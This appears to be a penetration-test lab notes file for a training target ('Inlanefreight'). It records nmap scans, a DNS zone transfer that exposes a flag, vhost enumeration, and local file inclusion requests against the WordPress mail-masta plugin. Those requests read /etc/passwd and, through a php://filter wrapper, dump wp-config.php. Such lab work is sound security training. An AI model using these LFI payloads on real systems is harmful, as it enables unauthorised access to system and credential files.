```
nmap -sC -sV 10.129.34.144 --open 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-05 13:01 -0500
Nmap scan report for 10.129.34.144
Host is up (0.22s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              38 May 30  2022 flag.txt
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp   open  domain   (unknown banner: 1337_HTB_DNS)
| dns-nsid: 
|_  bind.version: 1337_HTB_DNS
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    1337_HTB_DNS
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Inlanefreight
110/tcp  open  pop3     Dovecot pop3d
|_pop3-capabilities: TOP SASL STLS RESP-CODES PIPELINING CAPA UIDL AUTH-RESP-CODE
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_ssl-date: TLS randomness does not represent time
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: LITERAL+ ID LOGINDISABLEDA0001 more have post-login ENABLE capabilities listed STARTTLS IDLE SASL-IR OK IMAP4rev1 Pre-login LOGIN-REFERRALS
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: LITERAL+ ID AUTH=PLAINA0001 have more ENABLE capabilities listed IMAP4rev1 IDLE post-login SASL-IR OK Pre-login LOGIN-REFERRALS
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
995/tcp  open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Not valid before: 2022-05-30T17:15:40
|_Not valid after:  2032-05-27T17:15:40
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: TOP SASL(PLAIN) USER RESP-CODES PIPELINING CAPA UIDL AUTH-RESP-CODE
8080/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Support Center
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.991%I=7%D=11/5%Time=6AECC47A%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,39,"\x007\0\x06\x85\0\0\x01\0\x01\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03\xc0\x0c\0\x10\0\x03\0\0\0\0\0\r\x0c1337_HTB_DNS");
Service Info: Host:  ubuntu; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.41 seconds
                                                                         
```

```
 nmap -p- 10.129.34.144 --open -T5
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-05 13:01 -0500
Nmap scan report for 10.129.34.144
Host is up (0.049s latency).
Not shown: 60520 closed tcp ports (reset), 5004 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
110/tcp  open  pop3
111/tcp  open  rpcbind
143/tcp  open  imap
993/tcp  open  imaps
995/tcp  open  pop3s
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 33.69 seconds

```

## DNS Zone transfer

```
dig axfr inlanefreight.local @inlanefreight.local

; <<>> DiG 9.20.29-1-Debian <<>> axfr inlanefreight.local @inlanefreight.local
; (1 server found)
;; global options: +cmd
inlanefreight.local.    86400   IN      SOA     ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
inlanefreight.local.    86400   IN      NS      inlanefreight.local.
inlanefreight.local.    86400   IN      A       127.0.0.1
blog.inlanefreight.local. 86400 IN      A       127.0.0.1
careers.inlanefreight.local. 86400 IN   A       127.0.0.1
dev.inlanefreight.local. 86400  IN      A       127.0.0.1
flag.inlanefreight.local. 86400 IN      TXT     "HTB{DNs_ZOn3_Tr@nsf3r}"
gitlab.inlanefreight.local. 86400 IN    A       127.0.0.1
ir.inlanefreight.local. 86400   IN      A       127.0.0.1
status.inlanefreight.local. 86400 IN    A       127.0.0.1
support.inlanefreight.local. 86400 IN   A       127.0.0.1
tracking.inlanefreight.local. 86400 IN  A       127.0.0.1
vpn.inlanefreight.local. 86400  IN      A       127.0.0.1
inlanefreight.local.    86400   IN      SOA     ns1.inlanfreight.local. dnsadmin.inlanefreight.local. 21 604800 86400 2419200 86400
;; Query time: 40 msec
;; SERVER: 10.129.229.147#53(inlanefreight.local) (TCP)
;; WHEN: Thu Nov 05 13:12:03 EST 2026
;; XFR size: 14 records (messages 1, bytes 448)


```

## Vhost enum

```
gobuster vhost -u http://inlanefreight.local -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://inlanefreight.local
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /home/kali/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
dev.inlanefreight.local Status: 200 [Size: 2048]
vpn.inlanefreight.local Status: 200 [Size: 1578]
support.inlanefreight.local Status: 200 [Size: 26635]
blog.inlanefreight.local Status: 200 [Size: 8708]
status.inlanefreight.local Status: 200 [Size: 878]
monitoring.inlanefreight.local Status: 200 [Size: 56]
careers.inlanefreight.local Status: 200 [Size: 51806]
tracking.inlanefreight.local Status: 200 [Size: 35211]
ir.inlanefreight.local Status: 200 [Size: 28548]
gitlab.inlanefreight.local Status: 302 [Size: 113] [--> http://gitlab.inlanefreight.local/users/sign_in]
www.monitoring.inlanefreight.local Status: 200 [Size: 56]
#www.inlanefreight.local Status: 400 [Size: 301]
#mail.inlanefreight.local Status: 400 [Size: 301]
Progress: 19966 / 19966 (100.00%)
===============================================================
Finished
==============================================
```


## ir lfi

```shell
curl "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

```

```
 curl "http://ir.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php"
PD9waHANCi8qKg0KICogVGhlIGJhc2UgY29uZmlndXJhdGlvbiBmb3IgV29yZFByZXNzDQogKg0KICogVGhlIHdwLWNvbmZpZy5waHAgY3JlYXRpb24gc2NyaXB0IHVzZXMgdGhpcyBmaWxlIGR1cmluZyB0aGUgaW5zdGFsbGF0aW9uLg0KICogWW91IGRvbid0IGhhdmUgdG8gdXNlIHRoZSB3ZWIgc2l0ZSwgeW91IGNhbiBjb3B5IHRoaXMgZmlsZSB0byAid3AtY29uZmlnLnBocCINCiAqIGFuZCBmaWxsIGluIHRoZSB2YWx1ZXMuDQogKg0KICogVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBmb2xsb3dpbmcgY29uZmlndXJhdGlvbnM6DQogKg0KICogKiBEYXRhYmFzZSBzZXR0aW5ncw0KICogKiBTZWNyZXQga2V5cw0KICogKiBEYXRhYmFzZSB0YWJsZSBwcmVmaXgNCiAqICogQUJTUEFUSA0KICoNCiAqIFRoaXMgaGFzIGJlZW4gc2xpZ2h0bHkgbW9kaWZpZWQgKHRvIHJlYWQgZW52aXJvbm1lbnQgdmFyaWFibGVzKSBmb3IgdXNlIGluIERvY2tlci4NCiAqDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2VkaXRpbmctd3AtY29uZmlnLXBocC8NCiAqDQogKiBAcGFja2FnZSBXb3JkUHJlc3MNCiAqLw0KDQovLyBJTVBPUlRBTlQ6IHRoaXMgZmlsZSBuZWVkcyB0byBzdGF5IGluLXN5bmMgd2l0aCBodHRwczovL2dpdGh1Yi5jb20vV29yZFByZXNzL1dvcmRQcmVzcy9ibG9iL21hc3Rlci93cC1jb25maWctc2FtcGxlLnBocA0KLy8gKGl0IGdldHMgcGFyc2VkIGJ5IHRoZSB1cHN0cmVhbSB3aXphcmQgaW4gaHR0cHM6Ly9naXRodWIuY29tL1dvcmRQcmVzcy9Xb3JkUHJlc3MvYmxvYi9mMjdjYjY1ZTFlZjI1ZDExYjUzNTY5NWE2NjBlNzI4MmI5OGViNzQyL3dwLWFkbWluL3NldHVwLWNvbmZpZy5waHAjTDM1Ni1MMzkyKQ0KDQovLyBhIGhlbHBlciBmdW5jdGlvbiB0byBsb29rdXAgImVudl9GSUxFIiwgImVudiIsIHRoZW4gZmFsbGJhY2sNCmlmICghZnVuY3Rpb25fZXhpc3RzKCdnZXRlbnZfZG9ja2VyJykpIHsNCgkvLyBodHRwczovL2dpdGh1Yi5jb20vZG9ja2VyLWxpYnJhcnkvd29yZHByZXNzL2lzc3Vlcy81ODggKFdQLUNMSSB3aWxsIGxvYWQgdGhpcyBmaWxlIDJ4KQ0KCWZ1bmN0aW9uIGdldGVudl9kb2NrZXIoJGVudiwgJGRlZmF1bHQpIHsNCgkJaWYgKCRmaWxlRW52ID0gZ2V0ZW52KCRlbnYgLiAnX0ZJTEUnKSkgew0KCQkJcmV0dXJuIHJ0cmltKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlRW52KSwgIlxyXG4iKTsNCgkJfQ0KCQllbHNlIGlmICgoJHZhbCA9IGdldGVudigkZW52KSkgIT09IGZhbHNlKSB7DQoJCQlyZXR1cm4gJHZhbDsNCgkJfQ0KCQllbHNlIHsNCgkJCXJldHVybiAkZGVmYXVsdDsNCgkJfQ0KCX0NCn0NCg0KLy8gKiogRGF0YWJhc2Ugc2V0dGluZ3MgLSBZb3UgY2FuIGdldCB0aGlzIGluZm8gZnJvbSB5b3VyIHdlYiBob3N0ICoqIC8vDQovKiogVGhlIG5hbWUgb2YgdGhlIGRhdGFiYXNlIGZvciBXb3JkUHJlc3MgKi8NCmRlZmluZSggJ0RCX05BTUUnLCBnZXRlbnZfZG9ja2VyKCdXT1JEUFJFU1NfREJfTkFNRScsICd3b3JkcHJlc3MnKSApOw0KDQovKiogRGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCBnZXRlbnZfZG9ja2VyKCdXT1JEUFJFU1NfREJfVVNFUicsICdleGFtcGxlIHVzZXJuYW1lJykgKTsNCg0KLyoqIERhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsIGdldGVudl9kb2NrZXIoJ1dPUkRQUkVTU19EQl9QQVNTV09SRCcsICdleGFtcGxlIHBhc3N3b3JkJykgKTsNCg0KLyoqDQogKiBEb2NrZXIgaW1hZ2UgZmFsbGJhY2sgdmFsdWVzIGFib3ZlIGFyZSBzb3VyY2VkIGZyb20gdGhlIG9mZmljaWFsIFdvcmRQcmVzcyBpbnN0YWxsYXRpb24gd2l6YXJkOg0KICogaHR0cHM6Ly9naXRodWIuY29tL1dvcmRQcmVzcy9Xb3JkUHJlc3MvYmxvYi9mOWNjMzVlYmFkODI3NTNlOWM4NmRlMzIyZWE1Yzc2YTkwMDFjN2UyL3dwLWFkbWluL3NldHVwLWNvbmZpZy5waHAjTDIxNi1MMjMwDQogKiAoSG93ZXZlciwgdXNpbmcgImV4YW1wbGUgdXNlcm5hbWUiIGFuZCAiZXhhbXBsZSBwYXNzd29yZCIgaW4geW91ciBkYXRhYmFzZSBpcyBzdHJvbmdseSBkaXNjb3VyYWdlZC4gIFBsZWFzZSB1c2Ugc3Ryb25nLCByYW5kb20gY3JlZGVudGlhbHMhKQ0KICovDQoNCi8qKiBEYXRhYmFzZSBob3N0bmFtZSAqLw0KZGVmaW5lKCAnREJfSE9TVCcsIGdldGVudl9kb2NrZXIoJ1dPUkRQUkVTU19EQl9IT1NUJywgJ215c3FsJykgKTsNCg0KLyoqIERhdGFiYXNlIGNoYXJzZXQgdG8gdXNlIGluIGNyZWF0aW5nIGRhdGFiYXNlIHRhYmxlcy4gKi8NCmRlZmluZSggJ0RCX0NIQVJTRVQnLCBnZXRlbnZfZG9ja2VyKCdXT1JEUFJFU1NfREJfQ0hBUlNFVCcsICd1dGY4JykgKTsNCg0KLyoqIFRoZSBkYXRhYmFzZSBjb2xsYXRlIHR5cGUuIERvbid0IGNoYW5nZSB0aGlzIGlmIGluIGRvdWJ0LiAqLw0KZGVmaW5lKCAnREJfQ09MTEFURScsIGdldGVudl9kb2NrZXIoJ1dPUkRQUkVTU19EQl9DT0xMQVRFJywgJycpICk7DQoNCi8qKiNAKw0KICogQXV0aGVudGljYXRpb24gdW5pcXVlIGtleXMgYW5kIHNhbHRzLg0KICoNCiAqIENoYW5nZSB0aGVzZSB0byBkaWZmZXJlbnQgdW5pcXVlIHBocmFzZXMhIFlvdSBjYW4gZ2VuZXJhdGUgdGhlc2UgdXNpbmcNCiAqIHRoZSB7QGxpbmsgaHR0cHM6Ly9hcGkud29yZHByZXNzLm9yZy9zZWNyZXQta2V5LzEuMS9zYWx0LyBXb3JkUHJlc3Mub3JnIHNlY3JldC1rZXkgc2VydmljZX0uDQogKg0KICogWW91IGNhbiBjaGFuZ2UgdGhlc2UgYXQgYW55IHBvaW50IGluIHRpbWUgdG8gaW52YWxpZGF0ZSBhbGwgZXhpc3RpbmcgY29va2llcy4NCiAqIFRoaXMgd2lsbCBmb3JjZSBhbGwgdXNlcnMgdG8gaGF2ZSB0byBsb2cgaW4gYWdhaW4uDQogKg0KICogQHNpbmNlIDIuNi4wDQogKi8NCmRlZmluZSggJ0FVVEhfS0VZJywgICAgICAgICBnZXRlbnZfZG9ja2VyKCdXT1JEUFJFU1NfQVVUSF9LRVknLCAgICAgICAgICcxOTA3ZjFkZjlhYzFmZTY0ZGU0NzQwM2Q1MzEzOTdkMWYzNGNjMDU3JykgKTsNCmRlZmluZSggJ1NFQ1VSRV9BVVRIX0tFWScsICBnZXRlbnZfZG9ja2VyKCdXT1JEUFJFU1NfU0VDVVJFX0FVVEhfS0VZJywgICcyZTFjNDUzYzNlOTM5NjgwMmYyYzYxNDEwN2RlYTkyMjNhOGM5Zjk1JykgKTsNCmRlZmluZSggJ0xPR0dFRF9JTl9LRVknLCAgICBnZXRlbnZfZG9ja2VyKCdXT1JEUFJFU1NfTE9HR0VEX0lOX0tFWScsICAgICdlN2Y5NTQ1YjgwN2E5M2VmYjU0NjQzMTgwNmFjNWU5ZDcxNjY3MTViJykgKTsNCmRlZmluZSggJ05PTkNFX0tFWScsICAgICAgICBnZXRlbnZfZG9ja2VyKCdXT1JEUFJFU1NfTk9OQ0VfS0VZJywgICAgICAgICdhNTVhYmMzZTc1OGMxNzJmNmM2ZWUyNmJkYTRhY2FmNDRlODg5NmVlJykgKTsNCmRlZmluZSggJ0FVVEhfU0FMVCcsICAgICAgICBnZXRlbnZfZG9ja2VyKCdXT1JEUFJFU1NfQVVUSF9TQUxUJywgICAgICAgICc5MzcxYjZiMjk2MzI4Y2M5ZDFkOWMyOGU2MTA1OWIwNWI5OGM4NjdmJykgKTsNCmRlZmluZSggJ1NFQ1VSRV9BVVRIX1NBTFQnLCBnZXRlbnZfZG9ja2VyKCdXT1JEUFJFU1NfU0VDVVJFX0FVVEhfU0FMVCcsICc0MThjY2IzMGE2ZGNiNmNhNjg1NGE5MTU1OGRkODE2NDU3NThjYTZhJykgKTsNCmRlZmluZSggJ0xPR0dFRF9JTl9TQUxUJywgICBnZXRlbnZfZG9ja2VyKCdXT1JEUFJFU1NfTE9HR0VEX0lOX1NBTFQnLCAgICcwNGM4NDNkMjdmNmE1MTc0YmQwOTQ2NzMxMGM4MWNlMjMzOWUyNDk2JykgKTsNCmRlZmluZSggJ05PTkNFX1NBTFQnLCAgICAgICBnZXRlbnZfZG9ja2VyKCdXT1JEUFJFU1NfTk9OQ0VfU0FMVCcsICAgICAgICc3ZGMxYTc5YjFkOTAzMGM1YjUwYWVjOWY4MDNhMzNiNDFkYjM4OWQxJykgKTsNCi8vIChTZWUgYWxzbyBodHRwczovL3dvcmRwcmVzcy5zdGFja2V4Y2hhbmdlLmNvbS9hLzE1MjkwNS8xOTkyODcpDQoNCi8qKiNALSovDQoNCi8qKg0KICogV29yZFByZXNzIGRhdGFiYXNlIHRhYmxlIHByZWZpeC4NCiAqDQogKiBZb3UgY2FuIGhhdmUgbXVsdGlwbGUgaW5zdGFsbGF0aW9ucyBpbiBvbmUgZGF0YWJhc2UgaWYgeW91IGdpdmUgZWFjaA0KICogYSB1bmlxdWUgcHJlZml4LiBPbmx5IG51bWJlcnMsIGxldHRlcnMsIGFuZCB1bmRlcnNjb3JlcyBwbGVhc2UhDQogKi8NCiR0YWJsZV9wcmVmaXggPSBnZXRlbnZfZG9ja2VyKCdXT1JEUFJFU1NfVEFCTEVfUFJFRklYJywgJ3dwXycpOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKg0KICogQ2hhbmdlIHRoaXMgdG8gdHJ1ZSB0byBlbmFibGUgdGhlIGRpc3BsYXkgb2Ygbm90aWNlcyBkdXJpbmcgZGV2ZWxvcG1lbnQuDQogKiBJdCBpcyBzdHJvbmdseSByZWNvbW1lbmRlZCB0aGF0IHBsdWdpbiBhbmQgdGhlbWUgZGV2ZWxvcGVycyB1c2UgV1BfREVCVUcNCiAqIGluIHRoZWlyIGRldmVsb3BtZW50IGVudmlyb25tZW50cy4NCiAqDQogKiBGb3IgaW5mb3JtYXRpb24gb24gb3RoZXIgY29uc3RhbnRzIHRoYXQgY2FuIGJlIHVzZWQgZm9yIGRlYnVnZ2luZywNCiAqIHZpc2l0IHRoZSBkb2N1bWVudGF0aW9uLg0KICoNCiAqIEBsaW5rIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvZGVidWdnaW5nLWluLXdvcmRwcmVzcy8NCiAqLw0KZGVmaW5lKCAnV1BfREVCVUcnLCAhIWdldGVudl9kb2NrZXIoJ1dPUkRQUkVTU19ERUJVRycsICcnKSApOw0KDQovKiBBZGQgYW55IGN1c3RvbSB2YWx1ZXMgYmV0d2VlbiB0aGlzIGxpbmUgYW5kIHRoZSAic3RvcCBlZGl0aW5nIiBsaW5lLiAqLw0KDQovLyBJZiB3ZSdyZSBiZWhpbmQgYSBwcm94eSBzZXJ2ZXIgYW5kIHVzaW5nIEhUVFBTLCB3ZSBuZWVkIHRvIGFsZXJ0IFdvcmRQcmVzcyBvZiB0aGF0IGZhY3QNCi8vIHNlZSBhbHNvIGh0dHBzOi8vd29yZHByZXNzLm9yZy9zdXBwb3J0L2FydGljbGUvYWRtaW5pc3RyYXRpb24tb3Zlci1zc2wvI3VzaW5nLWEtcmV2ZXJzZS1wcm94eQ0KaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQX1hfRk9SV0FSREVEX1BST1RPJ10pICYmIHN0cnBvcygkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9QUk9UTyddLCAnaHR0cHMnKSAhPT0gZmFsc2UpIHsNCgkkX1NFUlZFUlsnSFRUUFMnXSA9ICdvbic7DQp9DQovLyAod2UgaW5jbHVkZSB0aGlzIGJ5IGRlZmF1bHQgYmVjYXVzZSByZXZlcnNlIHByb3h5aW5nIGlzIGV4dHJlbWVseSBjb21tb24gaW4gY29udGFpbmVyIGVudmlyb25tZW50cykNCg0KaWYgKCRjb25maWdFeHRyYSA9IGdldGVudl9kb2NrZXIoJ1dPUkRQUkVTU19DT05GSUdfRVhUUkEnLCAnJykpIHsNCglldmFsKCRjb25maWdFeHRyYSk7DQp9DQoNCi8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgcHVibGlzaGluZy4gKi8NCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==             
```